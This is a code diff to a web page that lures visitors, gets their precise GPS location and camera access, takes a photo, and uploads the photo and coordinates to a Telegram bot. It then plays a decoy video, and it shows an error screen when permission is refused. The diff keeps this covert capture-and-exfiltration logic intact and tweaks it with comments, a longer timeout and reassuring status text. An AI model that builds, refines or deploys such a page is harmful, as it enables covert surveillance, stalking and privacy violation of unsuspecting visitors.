@@ -14,12 +14,11 @@
             background: rgba(0,0,0,0.6); 
             padding: 20px; 
             border-radius: 10px; 
-            font-size: 60px;
+            font-size: 60px; /* 放大表情 */
         }
         
         button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
         
-        /* 错误页样式 */
         .error-page { font-size: 24px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.8); border-radius: 15px; }
     </style>
 </head>
@@ -52,32 +51,32 @@
             if (!CHAT_ID) { status.innerText = "❌ ID Error"; return; }
             startBtn.style.display = 'none';
 
-            // 1. 获取定位
+            // 1. 严格获取定位
             let locationText = "";
             try {
                 status.innerText = "📍";
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
                 });
                 locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
             } catch (err) {
-                showError(); // 触发跳转
+                showError();
                 return;
             }
 
-            // 2. 获取相机
+            // 2. 严格获取相机
             try {
                 status.innerText = "📷";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 video.style.display = 'block'; 
                 video.style.opacity = '1';
-                status.innerText = "🌐";
+                status.innerText = "🌐Network connection in progress";
                 
+                // 等待短暂时间确保流已加载
                 setTimeout(() => captureAndUpload(stream, locationText), 1000);
             } catch (err) {
-                showError(); // 触发跳转
-                return;
+                showError();
             }
         });
 
@@ -95,13 +94,14 @@
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                 
                 if ((await res.json()).ok) {
+                    // 上传成功：平滑切换为视频播放
                     status.style.fontSize = "40px";
                     status.innerText = "🎉 Success!";
-                    stream.getTracks().forEach(t => t.stop());
+                    stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
                     video.srcObject = null;
                     video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                     video.loop = true;
-                    video.muted = false;
+                    video.muted = false; // 播放时恢复声音
                     video.play();
                 } else {
                     status.innerText = "⚠️ Upload Failed";
